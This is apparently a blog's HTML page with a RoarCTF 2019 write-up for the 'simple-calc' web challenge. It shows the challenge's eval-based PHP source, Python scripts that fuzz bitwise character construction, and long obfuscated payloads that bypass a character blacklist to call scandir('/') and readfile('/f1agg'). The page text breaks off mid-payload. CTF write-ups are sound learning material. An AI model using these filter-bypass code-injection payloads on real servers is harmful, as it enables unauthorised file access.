@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      RoarCTF2019_web题解(待补充) | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>RoarCTF2019_web题解(待补充)</h2>
+  <p class="post-date">2019-10-16 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="simple-calc"><a href="#simple-calc" class="headerlink" title="simple-calc"></a>simple-calc</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>后端存在waf，不能使用英文字母，但是可以使用数字还有一些运算符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>思路：1. 利用php7 新增特性会将括号内的字符当做字符串</p>
+<pre><code>2. 利用数字的与或反三种运算（^被过滤）得到全部a-z等字符
+     3. 动态函数执行</code></pre><p>php7特性，字符串括号拼接当做字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((999999999999999999999).(1))&#123;3&#125;|((999999999999999999999999).(1))&#123;6&#125;</span><br><span class="line">u</span><br><span class="line">((999999999999999999999).(1))&#123;3&#125;|((999999999999999999999999).(1))&#123;4&#125;</span><br><span class="line">o</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload不能直接出现a数组其他的字符，否则会爆500，所以只能通过a数组中的字符进行与或得到其他额外字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line">a=[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'E'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>]</span><br><span class="line">b=[]</span><br><span class="line">c=[]</span><br><span class="line">d=[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b.append(i+<span class="string">'或'</span>+j+<span class="string">'-------'</span>+chr(ord(i)|ord(j)))</span><br><span class="line">        b1.append(chr(ord(i)|ord(j)))</span><br><span class="line"></span><br><span class="line">c1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        c.append(i+<span class="string">'与'</span>+j+<span class="string">'--------'</span>+chr(ord(i)&amp;ord(j)))</span><br><span class="line">        c1.append(chr(ord(i)&amp;ord(j)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> set(b1+c1):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> set(b1+c1):</span><br><span class="line">		d.append(i+<span class="string">'与'</span>+j+<span class="string">'--------'</span>+chr(ord(i)&amp;ord(j)))</span><br><span class="line">		d1.append(chr(ord(i)&amp;ord(j)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(set(d1+b1+c1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmp=[]</span></span><br><span class="line"><span class="comment"># for i in set(d1+b1+c1):</span></span><br><span class="line"><span class="comment">#     print(bin(ord(i)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=raw_input(<span class="string">"input you find: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (b+c+d):</span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">in</span> i:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以得到如下可用运算字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set([<span class="string">'\x01'</span>, <span class="string">'\x00'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span>, <span class="string">'!'</span>, <span class="string">' '</span>, <span class="string">'#'</span>, <span class="string">'"'</span>, <span class="string">'%'</span>, <span class="string">'$'</span>, <span class="string">"'"</span>, <span class="string">'&amp;'</span>, <span class="string">')'</span>, <span class="string">'('</span>, <span class="string">'+'</span>, <span class="string">'*'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>, <span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">';'</span>, <span class="string">':'</span>, <span class="string">'='</span>, <span class="string">'&lt;'</span>, <span class="string">'?'</span>, <span class="string">'&gt;'</span>, <span class="string">'E'</span>, <span class="string">'e'</span>, <span class="string">'g'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>, <span class="string">'w'</span>, <span class="string">'&#125;'</span>])</span><br></pre></td></tr></table></figure>
+
+<p>那么问题了，这是可用字符的极限了，我们可以打印如上字符的二进制</p>
+<p>最大位数是7bit,a-z的bit位数也正好是7位</p>
+<blockquote>
+<p>先看出一个规律</p>
+<p>6bit的字符，每个bit都可以通过与或得到0或1,可以得到6bit区间内的所有字符</p>
+<p>7bit的字符，倒三字符还有倒一都是1,无法与或置为0，限制了7bit额外字符的生成,也就是限制了a-z字符生成</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'0b1'</span>, <span class="string">'0b0'</span>, <span class="string">'0b101'</span>, <span class="string">'0b100'</span>, <span class="string">'0b100001'</span>, <span class="string">'0b100000'</span>, <span class="string">'0b100011'</span>, <span class="string">'0b100010'</span>, <span class="string">'0b100101'</span>, <span class="string">'0b100100'</span>, <span class="string">'0b100111'</span>, <span class="string">'0b100110'</span>, <span class="string">'0b101001'</span>, <span class="string">'0b101000'</span>, <span class="string">'0b101011'</span>, <span class="string">'0b101010'</span>, <span class="string">'0b101101'</span>, <span class="string">'0b101100'</span>, <span class="string">'0b101111'</span>, <span class="string">'0b101110'</span>, <span class="string">'0b110001'</span>, <span class="string">'0b110000'</span>, <span class="string">'0b110011'</span>, <span class="string">'0b110010'</span>, <span class="string">'0b110101'</span>, <span class="string">'0b110100'</span>, <span class="string">'0b110111'</span>, <span class="string">'0b110110'</span>, <span class="string">'0b111001'</span>, <span class="string">'0b111000'</span>, <span class="string">'0b111011'</span>, <span class="string">'0b111010'</span>, <span class="string">'0b111101'</span>, <span class="string">'0b111100'</span>, <span class="string">'0b111111'</span>, <span class="string">'0b111110'</span>, <span class="string">'0b1000101'</span>, <span class="string">'0b1100101'</span>, <span class="string">'0b1100111'</span>, <span class="string">'0b1101101'</span>, <span class="string">'0b1101111'</span>, <span class="string">'0b1110101'</span>, <span class="string">'0b1110111'</span>, <span class="string">'0b1111101'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>所以解决额外字符的思路出来了，制造出一个7bit二进制数，可以尽可能制造多的字符以节省劳动力，就不用费劲心思去运算得到其他字符。</p>
+<blockquote>
+<p>如下脚本fuzz使用哪个字符与可用字符与或，发现 ‘@’ 最好用 ,可以生成34个字符，二进制=&gt;0b1000000</p>
+<p>‘@’   生成可以用   ~’?’=&gt; (1或.——-?)</p>
+<p>在赋值到main参数，fuzz出可用字符与或结果</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">arr=[<span class="string">'\x01'</span>, <span class="string">'\x00'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span>, <span class="string">'!'</span>, <span class="string">' '</span>, <span class="string">'#'</span>, <span class="string">'"'</span>, <span class="string">'%'</span>, <span class="string">'$'</span>, <span class="string">"'"</span>, <span class="string">'&amp;'</span>, <span class="string">')'</span>, <span class="string">'('</span>, <span class="string">'+'</span>, <span class="string">'*'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>, <span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">';'</span>, <span class="string">':'</span>, <span class="string">'='</span>, <span class="string">'&lt;'</span>, <span class="string">'?'</span>, <span class="string">'&gt;'</span>, <span class="string">'E'</span>, <span class="string">'e'</span>, <span class="string">'g'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>, <span class="string">'w'</span>, <span class="string">'&#125;'</span>]</span><br><span class="line">arr1=string.printable</span><br><span class="line">print(len(arr1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fuzz可以创造出最多的字符</span></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> arr1:</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">            <span class="keyword">if</span> chr(ord(flag)&amp;ord(i)) == j:</span><br><span class="line">                tmp.append(j)</span><br><span class="line">                <span class="comment">#print(i+' [&amp;] '+j)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'[&amp;]flag: '</span>+ flag+<span class="string">"=&gt;"</span>+str(len(set(tmp))))</span><br><span class="line">    print(set(tmp))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> arr1:</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">            <span class="keyword">if</span> chr(ord(flag)|ord(i)) == j:</span><br><span class="line">                tmp.append(j)</span><br><span class="line">                <span class="comment">#print(i+' [&amp;] '+j)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'[|]flag: '</span>+ flag+<span class="string">"=&gt;"</span>+str(len(set(tmp))))</span><br><span class="line">    print(set(tmp))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入'@'逆推需要的字符    </span></span><br><span class="line">main=<span class="string">'@'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">        <span class="keyword">if</span> chr(ord(main)|ord(i)) == j:</span><br><span class="line">            print(i+<span class="string">' [|] '</span>+main+<span class="string">' =&gt; '</span>+j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> arr1:</span><br><span class="line">        <span class="keyword">if</span> chr(ord(main)&amp;ord(i)) == j:</span><br><span class="line">            print(i+<span class="string">' [&amp;] '</span>+main+<span class="string">' =&gt; '</span>+j)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>后面就手拼吧，脚本不会写了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先构造scandir(<span class="string">'/'</span>)扫描根目录下的文件，payload：</span><br><span class="line">?num=((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)).((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readfile(<span class="string">'/f1agg'</span>)，payload：</span><br><span class="line"></span><br><span class="line">?num=(((((<span class="number">1</span>).(<span class="number">2</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">5</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">9</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))%<span class="number">26</span>((((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">8</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">5</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)).((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)%<span class="number">26</span>(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).(((((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">9999999999999999999999</span>).(<span class="number">1</span>))&#123;<span class="number">4</span>&#125;))%<span class="number">26</span>(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">100000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)%<span class="number">26</span>(~((((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span 